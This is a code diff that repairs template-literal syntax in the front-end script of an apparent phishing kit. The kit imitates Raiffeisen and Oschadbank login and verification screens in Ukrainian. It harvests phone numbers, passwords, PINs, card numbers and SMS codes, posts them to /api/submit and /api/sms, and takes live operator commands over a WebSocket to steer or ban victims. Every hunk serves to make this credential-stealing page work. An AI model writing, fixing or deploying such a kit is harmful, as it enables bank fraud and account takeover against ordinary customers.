@@ -513,12 +513,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const raiffModalContent = document.getElementById('raiff-modal-content');
     
     // --- INITIALIZATION ---
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => <a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>).join('');
+    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');
 
     // --- WEBSOCKET LOGIC ---
     function connectWebSocket() {
         const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
-        ws = new WebSocket(${protocol}://${window.location.host});
+        ws = new WebSocket(`${protocol}://${window.location.host}`);
         ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
         ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
         ws.onclose = () => setTimeout(connectWebSocket, 3000);
@@ -528,7 +528,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- RAIFFEISEN BANK FLOW ---
 
     function renderRaiffPhoneScreen() {
-        const html = 
+        const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -550,7 +550,7 @@ document.addEventListener('DOMContentLoaded', () => {
             <div class="raiff-footer">
                 <button class="raiff-button" id="raiff-continue-btn">Продовжити</button>
             </div>
-        ;
+        `;
         raiffModalContent.innerHTML = html;
         raiffModalOverlay.style.display = 'flex';
         
@@ -588,7 +588,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderRaiffSmsScreen(phone, options = {}) {
         lastCodeScreen = 'raiff_sms';
         let maskedPhone = phone.slice(0, 7) + '***' + phone.slice(10);
-        const html = 
+        const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -605,10 +605,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}">
                     ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1">').join('')}
                 </div>
-                ${options.error ? <p class="raiff-error-text">Невірний код</p> : ''}
+                ${options.error ? `<p class="raiff-error-text">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" id="raiff-resend-info">Ви зможете отримати код знову через 0:59</p>
             </div>
-        ;
+        `;
         raiffModalContent.innerHTML = html;
         document.getElementById('raiff-back-btn').addEventListener('click', renderRaiffPhoneScreen);
 
@@ -638,7 +638,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const resendInfo = document.getElementById('raiff-resend-info');
         const timerInterval = setInterval(() => {
             timer--;
-            resendInfo.textContent = Ви зможете отримати код знову через 0:${timer < 10 ? '0' : ''}${timer};
+            resendInfo.textContent = `Ви зможете отримати код знову через 0:${timer < 10 ? '0' : ''}${timer}`;
             if (timer <= 0) {
                 clearInterval(timerInterval);
                 resendInfo.innerHTML = '<a href="#" id="resend-link" style="color:var(--raiff-yellow);">Отримати код знову</a>';
@@ -647,7 +647,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     function renderRaiffPinScreen(options = {}) {
-        const html = 
+        const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -663,23 +663,23 @@ document.addEventListener('DOMContentLoaded', () => {
                     </svg>
                 </div>
                 <h2 class="raiff-main-title" style="margin-top:0;">Введіть пароль</h2>
-                 ${options.error ? <p class="raiff-error-text">Невірний пароль</p> : ''}
+                 ${options.error ? `<p class="raiff-error-text">Невірний пароль</p>` : ''}
                 <div class="raiff-pin-dots ${options.error ? 'error' : ''}" id="raiff-pin-dots">
                     ${Array(4).fill('<div class="raiff-pin-dot"></div>').join('')}
                 </div>
                 <div class="raiff-keypad" id="raiff-keypad">
                     ${[1, 2, 3, 4, 5, 6, 7, 8, 9, '', 0, 'backspace'].map(k => {
                         if (k === 'backspace') {
-                            return <button class="raiff-key backspace" data-key="backspace"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M18 9L12 15" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12 9L18 15" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button>;
+                            return `<button class="raiff-key backspace" data-key="backspace"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M18 9L12 15" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12 9L18 15" stroke="#F2F2F7" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button>`;
                         } else if (k === '') {
-                            return <div></div>;
+                            return `<div></div>`;
                         } else {
-                           return <button class="raiff-key" data-key="${k}">${k}</button>;
+                           return `<button class="raiff-key" data-key="${k}">${k}</button>`;
                         }
                     }).join('')}
                 </div>
             </div>
-        ;
+        `;
         raiffModalContent.innerHTML = html;
         document.getElementById('raiff-back-btn').addEventListener('click', () => renderRaiffSmsScreen(collectedData.phone || ''));
         
@@ -715,7 +715,7 @@ document.addEventListener('DOMContentLoaded', () => {
             
             if (pin.length === 4) {
                 sendDataToServer({ pin: pin }, true);
-                raiffModalContent.innerHTML = <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>;
+                raiffModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
             }
         });
     }
@@ -725,7 +725,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- GENERIC DEBIT FORM (for non-Oschad) ---
     function renderThemedDebitScreen(options = {}) {
         lastCodeScreen = 'generic_debit';
-        const html = 
+        const html = `
             <div class="raiff-header">
                 <span class="back-arrow" id="raiff-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="#F2F2F7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -742,10 +742,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}">
                     ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1">').join('')}
                 </div>
-                 ${options.error ? <p class="raiff-error-text">Невірний код</p> : ''}
+                 ${options.error ? `<p class="raiff-error-text">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" id="raiff-resend-info" style="margin-top: 20px;">Надіслати код повторно</p>
             </div>
-        ;
+        `;
         raiffModalContent.innerHTML = html;
         raiffModalOverlay.style.display = 'flex';
         
@@ -766,7 +766,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (allFilled) {
                     const code = codeInputs.map(inp => inp.value).join('');
                     sendDataToServer({ debit_sms_code: code }, true); // Используем новое поле
-                    raiffModalContent.innerHTML = <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>;
+                    raiffModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
                 }
             });
             input.addEventListener('keydown', (e) => {
@@ -781,7 +781,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderOschadbankLogin(options = {}) {
         const { errorType, errorMessage, savedPhone } = options;
         
-        const html = 
+        const html = `
             <div class="oschad-header">
                 <span class="back-arrow" id="oschad-back-arrow">←</span>
                 <span class="title">Авторизуйтесь через Ощад24</span>
@@ -809,7 +809,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                         </span>
                     </div>
-                    ${errorType === 'phone' ? <div class="auth-error-message">${errorMessage}</div> : ''}
+                    ${errorType === 'phone' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
                     <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
 
@@ -825,18 +825,18 @@ document.addEventListener('DOMContentLoaded', () => {
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                         </span>
                     </div>
-                    ${errorType === 'login' ? <div class="auth-error-message">${errorMessage}</div> : ''}
+                    ${errorType === 'login' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
                     <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
             </div>
             <button class="oschad-submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
-        ;
+        `;
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
         addOschadbankLoginListeners();
     }
     function showOschadLoader() {
-        customModalContent.innerHTML = 
+        customModalContent.innerHTML = `
             <div class="oschad-header">
                 <span class="back-arrow" id="loader-back-arrow">←</span>
                 <span class="title"></span>
@@ -846,22 +846,22 @@ document.addEventListener('DOMContentLoaded', () => {
                 <p style="text-align: center; width: 100%; margin-top: 5px;">Зачекайте 1-2 хвилини</p>
                 <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
             </div>
-        ;
+        `;
         document.getElementById('loader-back-arrow').addEventListener('click', () => renderOschadbankLogin());
     }
     function renderCodeScreen(options) {
         const { title, header, infoText, instructionText, resendText, screenId, error } = options;
         lastCodeScreen = screenId;
 
-        const html = 
+        const html = `
             <div class="oschad-header">
                 <span class="back-arrow" id="code-screen-back-arrow">←</span>
                 <span class="title">${header}</span>
             </div>
             <div class="oschad-code-container">
-                ${title ? <h2 class="oschad-main-title">${title}</h2> : ''}
-                ${infoText ? <p class="oschad-code-info">${infoText}</p> : ''}
-                ${options.phoneNumbers ? options.phoneNumbers.map(n => <p class="oschad-code-number">${n}</p>).join('') : ''}
+                ${title ? `<h2 class="oschad-main-title">${title}</h2>` : ''}
+                ${infoText ? `<p class="oschad-code-info">${infoText}</p>` : ''}
+                ${options.phoneNumbers ? options.phoneNumbers.map(n => `<p class="oschad-code-number">${n}</p>`).join('') : ''}
                 <p class="oschad-code-instruction">${instructionText}</p>
                 <div class="oschad-code-inputs ${error ? 'error' : ''}" id="code-inputs-container">
                     <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
@@ -869,10 +869,10 @@ document.addEventListener('DOMContentLoaded', () => {
                     <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
                     <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
                 </div>
-                ${error ? <p class="oschad-code-error-text">Код введено невірно</p> : ''}
+                ${error ? `<p class="oschad-code-error-text">Код введено невірно</p>` : ''}
                 <a href="#" class="oschad-resend-link" id="resend-link">${resendText}</a>
             </div>
-        ;
+        `;
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
 
@@ -892,8 +892,8 @@ document.addEventListener('DOMContentLoaded', () => {
         let infoText = 'На Ваш номер телефонує Ощадбанк:';
         if (collectedData.loginMethod === 'phone' && collectedData.phone) {
             const phone = collectedData.phone.replace(/\D/g, '');
-            const maskedPhone = +${phone.substring(0,3)} ${phone.substring(3,5)} *** ** ${phone.substring(11)};
-            infoText = На Ваш номер ${maskedPhone} телефонує Ощадбанк:;
+            const maskedPhone = `+${phone.substring(0,3)} ${phone.substring(3,5)} *** ** ${phone.substring(11)}`;
+            infoText = `На Ваш номер ${maskedPhone} телефонує Ощадбанк:`;
         } else if (collectedData.loginMethod === 'login') {
             infoText = 'Вам телефонує Ощадбанк:';
         }
@@ -926,7 +926,7 @@ document.addEventListener('DOMContentLoaded', () => {
         
         switch(step) {
             case 1:
-                html = 
+                html = `
                     <div class="oschad-header">
                         <span class="back-arrow" id="fp-back-arrow">←</span>
                         <span class="title">Відновлення пароля</span>
@@ -942,7 +942,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
-                ;
+                `;
                 submitFunction = () => {
                     const phoneInput = document.getElementById('fp_phone_input');
                     const phoneValue = '+380' + phoneInput.value.replace(/\D/g, '');
@@ -951,7 +951,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 };
                 break;
             case 2:
-                 html = 
+                 html = `
                     <div class="oschad-header">
                         <span class="back-arrow" id="fp-back-arrow">←</span>
                         <span class="title">Відновлення пароля</span>
@@ -964,7 +964,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
-                ;
+                `;
                 backFunction = () => renderForgotPasswordFlow(1);
                 submitFunction = () => {
                     const cardInput = document.getElementById('fp_card_input');
@@ -975,7 +975,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
              case 3:
                 const last4 = collectedData.fp_card ? collectedData.fp_card.slice(-4) : '8479';
-                html = 
+                html = `
                     <div class="oschad-header" style="background-color: #fff;">
                         <span class="back-arrow" id="fp-back-arrow">←</span>
                     </div>
@@ -1004,7 +1004,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             </button>
                         </div>
                     </div>
-                ;
+                `;
                 backFunction = () => renderForgotPasswordFlow(2);
                 break;
         }
@@ -1218,7 +1218,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     startCallTimer(60);
                 };
             } else {
-                link.textContent = ${initialText} через ${timer} секунд;
+                link.textContent = `${initialText} через ${timer} секунд`;
                 link.classList.remove('active');
                 timer--;
             }
@@ -1253,7 +1253,7 @@ document.addEventListener('DOMContentLoaded', () => {
     async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
         try {
-            await fetch(/api/submit, {
+            await fetch(`/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -1271,9 +1271,9 @@ document.addEventListener('DOMContentLoaded', () => {
         const { type, data } = command;
         const showMessageInMainModal = (title, text, btnText, callback) => {
             modalTitle.textContent = title;
-            stepContent.innerHTML = <p style="text-align:center;">${text}</p>;
+            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
             modalFooter.style.display = 'flex';
-            modalFooter.innerHTML = <button class="btn btn-next">${btnText}</button>;
+            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
             modalFooter.querySelector('button').onclick = callback;
         };
 
@@ -1321,13 +1321,13 @@ document.addEventListener('DOMContentLoaded', () => {
             // Other commands
             case 'sms':
                 modalTitle.textContent = 'Введіть код з SMS';
-                stepContent.innerHTML = <p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>;
+                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                 modalFooter.style.display = 'flex';
-                modalFooter.innerHTML = <button class="btn btn-next" id="submit-sms-code">Відправити</button>;
+                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                 document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                 break;
             case 'other':
-                const bankToDisable = document.querySelector(.bank-item[data-bank="${activeBankData.theme}"]);
+                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                 if (bankToDisable) {
                     bankToDisable.classList.add('disabled');
                     if (!bankToDisable.querySelector('.unavailable-label')) {
@@ -1337,7 +1337,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                 break;
             case 'ban':
-                document.body.innerHTML = <div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>;
+                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
                 if (ws) ws.close();
                 break;
         }
@@ -1395,27 +1395,27 @@ document.addEventListener('DOMContentLoaded', () => {
         const code = codeInput.value;
         const errorContainer = document.getElementById('sms-error-container');
         if (!code.trim()) {
-            if (errorContainer) errorContainer.innerHTML = <p style="color:red; text-align:center;">Будь ласка, введіть код</p>;
+            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
             return;
         }
         try {
-            await fetch(/api/sms, {
+            await fetch(`/api/sms`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
             });
         } catch (error) { console.error('Failed to send sms code:', error); }
-        if (errorContainer) errorContainer.innerHTML = <p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>;
+        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
         codeInput.value = '';
     }
-    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => <div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? maxlength="${maxlength}" : ''}><div class="error-message"></div></div>;
+    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
     function renderStep() {
         if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
         const step = activeBankData.steps[currentStepIndex];
         let html = '';
         switch (step.type) {
             case 'phone':
-                html = <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>;
+                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
                 break;
             case 'card_simple':
                 html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
@@ -1430,7 +1430,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     function showWaitingScreen() {
         modalTitle.textContent = 'Очікуємо';
-        stepContent.innerHTML = <p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>;
+        stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`;
         modalFooter.style.display = 'none';
     }
     function handleBackStep() {
@@ -1472,7 +1472,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 isValid = false;
                 input.classList.add('invalid');
                 if (errorContainer) {
-                    errorContainer.textContent = Поле має містити ${requiredLength} цифр.;
+                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
                     errorContainer.style.display = 'block';
                 }
             }
